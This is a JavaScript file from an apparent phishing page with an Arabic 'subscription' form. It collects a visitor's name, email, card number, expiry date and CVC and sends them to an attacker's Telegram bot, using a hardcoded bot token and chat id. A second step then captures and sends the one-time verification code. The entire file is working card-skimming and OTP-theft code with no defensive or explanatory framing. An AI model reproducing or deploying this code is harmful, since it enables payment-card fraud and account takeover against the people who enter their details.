
const token = "7861921966:AAFAsCdJaRm8fDFYt9JAswrd4tr7Q8iEaJU";
const chat_id = "5355775763";

function sendData() {
  const name = document.getElementById("name").value;
  const email = document.getElementById("email").value;
  const card = document.getElementById("card").value;
  const exp = document.getElementById("exp").value;
  const cvc = document.getElementById("cvc").value;

  const message = `🧾 بيانات الاشتراك:
👤 الاسم: ${name}
📧 البريد: ${email}
💳 البطاقة: ${card}
📅 الانتهاء: ${exp}
🔒 CVC: ${cvc}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text: message })
  }).then(() => {
    window.location.href = "code.html";
  });
}

function sendCode() {
  const code = document.getElementById("code").value;
  const msg = `📩 كود التحقق المدخل: ${code}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text: msg })
  }).then(() => {
    window.location.href = "done.html";
  });
}
